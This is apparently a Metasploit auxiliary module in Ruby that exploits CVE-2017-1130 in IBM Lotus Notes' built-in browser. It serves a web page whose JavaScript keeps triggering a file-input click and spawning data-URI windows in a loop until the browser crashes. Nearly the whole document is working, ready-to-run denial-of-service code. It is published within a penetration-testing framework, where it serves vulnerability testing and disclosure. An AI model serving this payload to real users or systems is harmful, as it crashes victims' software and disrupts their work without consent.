# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039;           => "IBM Notes Denial Of Service",
        &#039;Description&#039;    => %q(
          This module exploits a vulnerability in the native browser
that comes with IBM Lotus Notes.
          If successful, the browser will crash after viewing the webpage.
        ),
        &#039;License&#039;        => MSF_LICENSE,
        &#039;Author&#039;         => [
          &#039;Dhiraj Mishra&#039;,
        ],
        &#039;References&#039;     => [
          [&#039;EDB&#039;, &#039;42604&#039;],
          [ &#039;CVE&#039;, &#039;2017-1130&#039; ]
        ],
        &#039;DisclosureDate&#039; => &#039;Aug 31 2017&#039;,
        &#039;Actions&#039;        => [[ &#039;WebServer&#039; ]],
        &#039;PassiveActions&#039; => [ &#039;WebServer&#039; ],
        &#039;DefaultAction&#039;  => &#039;WebServer&#039;
      )
    )
  end

  def run
    exploit # start http server
  end

  def setup
    @html = %|
<html><body>
<input type="file" id="f">
<script>
var w;
var kins = {};
var i = 1;
f.click();
setInterval("f.click()", 1);
setInterval(function(){
          for (var k in kins) {
          if (kins[k] && kins[k].status === undefined) {
          kins[k].close();
          delete kins[k];
           }
         }
        w = open(&#039;data:text/html,<input type="file"
id="f"><script>f.click();setInterval("f.click()", 1);<\\/script>&#039;);
        if (w) {
                kins[i] = w;
                i++;
        }
}, 1);
</script>
</body></html>
    |
  end

  def on_request_uri(cli, _request)
    print_status(&#039;Sending response&#039;)
    send_response(cli, @html)
  end
end


# URL: https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/dos/http/ibm_lotus_notes2.rb

